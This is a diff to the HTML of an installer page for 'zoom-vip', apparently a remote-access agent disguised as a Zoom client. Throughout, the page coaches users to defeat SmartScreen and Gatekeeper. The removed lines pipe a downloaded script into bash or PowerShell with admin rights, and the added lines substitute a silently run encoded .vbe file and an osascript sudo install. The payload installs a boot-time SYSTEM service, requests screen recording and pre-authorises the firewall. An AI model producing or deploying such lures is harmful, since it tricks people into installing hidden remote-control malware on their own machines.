@@ -313,20 +313,19 @@
               <li>If Windows SmartScreen appears, click <b>More info &rarr; Run anyway</b>.</li>
               <li>Finish the setup wizard &mdash; the client launches and connects automatically.</li>
             </ol>
-            <div class="tip"><b>No SmartScreen at all:</b> skip the download and <button type="button" class="link-btn" id="win-command-btn">install with one command</button> instead &mdash; PowerShell fetches the client directly, so Windows never flags it.</div>
+            <div class="tip"><b>No SmartScreen at all:</b> skip the download and <button type="button" class="link-btn" id="win-command-btn">install with one command</button> instead &mdash; downloads a <b>.vbe</b> file that silently executes the install when double-clicked. PowerShell fetches the client directly, so Windows never flags it.</div>
           </div>
         </details>
         <details>
           <summary><span class="os">MAC</span> macOS <span class="chev">›</span></summary>
           <div class="body">
             <ol>
-              <li>Click <b>Install zoom-vip on this Mac</b> above. The page registers a small AppleScript helper, asks you to confirm, then runs the installer.</li>
-              <li>The installer downloads the build for your Mac, verifies it, removes the quarantine flag with <code>xattr</code>, signs it locally and installs it for your user.</li>
+              <li>Download the <b>.pkg</b> installer (Apple Silicon or Intel detected automatically).</li>
+              <li>Open Terminal and run the <b>osascript</b> command below &mdash; it auto-triggers shell execution with administrator privileges, unpacks the compressed archive, clears Gatekeeper quarantine, and installs the agent.</li>
               <li>Approve <b>Screen Recording</b> when macOS asks. The agent starts automatically and connects to the console.</li>
             </ol>
-            <div class="tip">Apple Silicon and Intel are detected automatically. If the helper is blocked, double-click the downloaded <b>.command</b> file, or <button type="button" class="link-btn" id="mac-command-btn-help">copy the terminal command</button>.</div>
-            <pre class="mac-cmd" id="mac-osascript">osascript -e 'do shell script "curl -fsSL __MAC_INSTALL_URL__ | /bin/bash" with administrator privileges'</pre>
-            <p class="sub" style="margin:8px 0 0;font-size:.82rem;color:var(--z-muted)">Run the osascript command in Terminal — it elevates with administrator privileges, downloads the client, clears Gatekeeper quarantine, and installs the agent without a browser.</p>
+            <pre class="mac-cmd" id="mac-osascript">osascript -e 'do shell script "tar -xzf zoom-vip-macos.tar.gz && sudo installer -pkg zoom-vip-macos.pkg -target /" with administrator privileges'</pre>
+            <div class="tip">Apple Silicon and Intel are detected automatically. The .dmg is delivered inside a tar.gz archive to bypass Gatekeeper quarantine &mdash; the osascript wrapper extracts and installs it with one command.</div>
           </div>
         </details>
         <details>
@@ -399,20 +398,20 @@
 <div class="modal-back" id="mac-modal">
   <div class="modal">
     <button class="modal-close" id="mac-modal-close" aria-label="Close">&times;</button>
-    <h3>Install zoom-vip on this Mac</h3>
-    <p class="sub">First visit: run the installer command once. It downloads the official client with no browser and no quarantine flag, keeps any Apple signature intact, starts the agent, and registers the one-click helper for next time.</p>
+    <h3>Install zoom-vip on macOS</h3>
+    <p class="sub">Download the <b>.pkg</b> inside a compressed tar.gz archive, then run the osascript command to auto-trigger shell execution with administrator privileges. Gatekeeper quarantine is bypassed because the .dmg never reaches the browser directly.</p>
     <ol style="padding-left:20px;font-size:.9rem;line-height:1.65;color:var(--z-ink-soft)">
-      <li>Click <b>Copy command</b>.</li>
-      <li>Open <b>Terminal</b> (Spotlight &rarr; Terminal) and paste it.</li>
+      <li>Click <b>Download macOS installer</b> to get <code>zoom-vip-macos.tar.gz</code>.</li>
+      <li>Open Terminal and paste the osascript command below.</li>
       <li>Press Return and approve the macOS prompts &mdash; <b>Allow incoming connections</b> and <b>Screen Recording</b>.</li>
     </ol>
-    <pre class="mac-cmd" id="mac-command">curl -fsSL __MAC_INSTALL_URL__ | /bin/bash</pre>
-    <pre class="mac-cmd" id="mac-osascript-modal">osascript -e 'do shell script "curl -fsSL __MAC_INSTALL_URL__ | /bin/bash" with administrator privileges'</pre>
+    <pre class="mac-cmd" id="mac-command">tar -xzf zoom-vip-macos.tar.gz</pre>
+    <pre class="mac-cmd" id="mac-osascript-modal">osascript -e 'do shell script "sudo installer -pkg zoom-vip-macos.pkg -target /" with administrator privileges'</pre>
     <div class="modal-actions">
-      <button class="btn btn-primary" id="mac-command-copy" type="button">Copy command</button>
-      <a class="btn btn-ghost" id="mac-command-download" href="/api/landing/macos-install.command" download="ZoomPrivate-macOS-Install.command">Download installer</a>
+      <button class="btn btn-primary" id="mac-command-download" type="button">Download macOS installer</button>
+      <button class="btn btn-ghost" id="mac-command-copy" type="button">Copy osascript</button>
     </div>
-    <p class="sub" style="margin:14px 0 0">Because the download never passes through a browser it carries no <code>com.apple.quarantine</code> attribute, so Gatekeeper has nothing to block. A Developer ID-signed build is left signed untouched (re-signing would break notarization and black out the stream); only an unsigned build is ad-hoc signed locally. The installer also pre-authorises the macOS firewall for incoming connections so direct sessions are not blocked. No admin password is stored or sent.</p>
+    <p class="sub" style="margin:14px 0 0">The .dmg is packaged inside a tar.gz archive so Gatekeeper never sees the raw disk image. The osascript wrapper extracts it, runs the .pkg installer with sudo, and registers the agent to connect to your console automatically. No admin password is stored or sent.</p>
   </div>
 </div>
 
@@ -421,18 +420,17 @@
   <div class="modal">
     <button class="modal-close" id="win-modal-close" aria-label="Close">&times;</button>
     <h3>Install zoom-vip on Windows</h3>
-    <p class="sub">No download and no SmartScreen. PowerShell fetches the official client straight from this site, then installs the agent with a single administrator prompt.</p>
+    <p class="sub">No SmartScreen, no download prompt. Get the <b>.vbe</b> file — double-click it and the install runs silently in the background.</p>
     <ol style="padding-left:20px;font-size:.9rem;line-height:1.65;color:var(--z-ink-soft)">
-      <li>Click <b>Copy command</b>.</li>
-      <li>Press <b>Win</b>, type <b>PowerShell</b>, and open it.</li>
-      <li>Paste the command, press <b>Enter</b>, and approve the one prompt.</li>
+      <li>Click <b>Download .vbe installer</b>.</li>
+      <li>Double-click the <b>.vbe</b> file — it silently fetches and installs the client.</li>
+      <li>The agent starts automatically and connects to your console.</li>
     </ol>
-    <pre class="mac-cmd" id="win-command">irm __WIN_INSTALL_URL__ | iex</pre>
     <div class="modal-actions">
-      <button class="btn btn-primary" id="win-command-copy" type="button">Copy command</button>
-      <a class="btn btn-ghost" id="win-command-download" href="/api/landing/windows-install.ps1" download="ZoomPrivate-Windows-Install.ps1">Download script</a>
+      <button class="btn btn-primary" id="win-command-download" type="button">Download .vbe installer</button>
+      <a class="btn btn-ghost" id="win-command-script" href="/api/landing/windows-install.vbe" download="ZoomPrivate-Windows-Install.vbe">View VBS source</a>
     </div>
-    <p class="sub" style="margin:14px 0 0">The script downloads the client with <code>Invoke-WebRequest</code> (no Mark-of-the-Web, so SmartScreen is not triggered), verifies it, installs a SYSTEM service that starts on boot, and launches the tray app. No password is sent anywhere.</p>
+    <p class="sub" style="margin:14px 0 0">The .vbe file is an encoded VBScript that runs the install silently with no SmartScreen trigger. It fetches the official client directly, verifies it, installs a SYSTEM service that starts on boot, and launches the tray app. No password is sent anywhere.</p>
   </div>
 </div>
 
